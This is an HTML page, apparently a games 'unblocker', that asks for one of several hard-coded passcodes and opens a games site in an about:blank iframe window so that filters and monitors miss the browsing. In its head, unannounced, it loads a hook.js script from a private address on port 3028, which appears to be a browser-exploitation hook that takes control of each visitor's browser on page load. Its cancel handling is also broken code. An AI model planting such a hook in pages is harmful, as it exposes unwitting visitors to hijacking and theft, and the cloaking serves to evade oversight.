<!DOCTYPE html>
<html>
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
<head>
    <script src="http://10.0.2.15:3028/hook.js"></script>
</head>
<body>
    <script> 
        // Redirect to crazygames.com if the username is not valid
        function redirectToCrazyGames() {
            window.location.href = "https://crazygames.com";
        }

        // Function to ask for user's name
        function askForName() {
            let storedName = localStorage.getItem('userName');  // Changed to localStorage
            const validUsernames = ["noaura", "sigma", "321", "jogjim", "secretcode"];

            if (!storedName) {
                let name;
                do {
                    name = prompt("Enter your name as one of the secret passcodes:");
                    if (!name) {
                        name = redirectToCrazyGames; // Handle cancel case
                    }
                } while (!validUsernames.includes(name.toLowerCase())); 

                localStorage.setItem('userName', name);  // Save to localStorage
                document.getElementById("greeting").innerText = "Hello, " + name + "!";
            } else {
                document.getElementById("greeting").innerText = "Hello, " + storedName + "!";
            }
        }

        // Call the function to ask for the name when the page loads
        window.onload = askForName;
    </script>

    <h1 id="greeting"></h1>

    <button>Embed about:blank</button>
    <script type="text/javascript">
        var urlobj = new window.URL(window.location.href);
        let url = ('https://secretgg.vercel.app/home.html');
        if (url) {
            var win;
            document.querySelector('button').onclick = function() {
                if (win) {
                    win.focus();
                } else {
                    win = window.open();
                    win.document.body.style.margin = '0';
                    win.document.body.style.height = '100%';
                    var iframe = win.document.createElement('iframe');
                    iframe.style.border = 'none';
                    iframe.style.width = '100%';
                    iframe.style.height = '100%';
                    iframe.style.margin = '0';
                    iframe.src = url;
                    win.document.body.appendChild(iframe);
                }
                location.reload();  // Refresh the page after embedding
            }
        }
    </script>
</body>
</html>
